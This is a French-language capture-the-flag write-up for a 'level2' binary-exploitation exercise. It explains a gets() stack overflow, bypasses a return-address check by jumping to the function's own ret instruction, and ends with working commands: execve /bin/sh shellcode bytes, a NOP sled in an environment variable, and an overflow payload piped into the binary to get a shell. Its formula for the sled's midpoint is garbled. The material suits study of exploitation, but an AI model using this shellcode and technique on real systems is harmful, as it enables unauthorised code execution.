
## Level 2

En dessasemblant le binaire level2, on trouve deux fonctions:

`main()` qui fait un simple appel a `p()`.

`p()` déclare un tableau de 76 bytes.
La fonction va lire sur l'entrée standart avec l'appel `gets()`qui est vulnérable, et stocker le resultat dans ce
tableau `src`.

![image](https://user-images.githubusercontent.com/29956389/94676129-271acc00-031b-11eb-8e8e-b462d6902a54.png)

Ensuite un pointeur est déclaré a l'adresse `[ebp + 0x4]`.
Une opération binaire est éffectué sur cette adresse, une condition est ensuite vérifié:

Si la condition est vrai, le programme affiche l'adresse du pointeur et quitte.

Si la condition est fausse, la chaine de caractère est affiché et copié, puis la
fonction quitte.

Le pointeur [ebp + 0x4] est en dehors de notre stackframe, la condition vérifie donc si un overflow a modifié l'adresse a cette adresse, qui est l'adresse de retour a laquelle la fonction sautera a la fin de l'execution.

Comme la condition vérifie que le premier byte qui overflow le tableau commence
par `0xb (adresse de stack)`, on ne peut pas directement placer l'adresse de notre
nopsled dedans (Qui serait d'habitude soit sur la stack, soit dans l'environement).

Par contre, on peut y déclarer toute autre valeur, comme par exemple l'adresse
de l'instruction `return` de cette fonction meme fonction. Cela nous permetra de retourner deux fois de la fonction: une premiere fois pour passer la verification, puis une deuxieme fois pour aller a notre shellcode. c'est pourquoi il faut bien ecrire l'adresse du millieu de notre nopsled ensuite.

Le calcul a effectuer pour avoir l'adresse du millieu de notre nopsled est le suivant : 
 - Adresse variable SHELLCODE + (Adresse variable SHELLCODE+ 1 - Addresse variable SHELCODE) / 2

Soit `[80 bytes pour remplir le buffer] + [Adresse instruction ret de la fonction p()] + [Adresse millieu du Nopsled]`.

En code:

`echo -ne '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' > /tmp/shellcode.bin`

`export SLEDCODE=$(python -c 'print "\x90"*128')$(cat /tmp/shellcode.bin)`

`python -c 'print "B"*80 + "\x3e\x85\x04\x08" + "\x10\xf9\xff\xbf"' > /tmp/buffer`

`cat /tmp/buffer - | ./level2`

Et on obtient un shell!
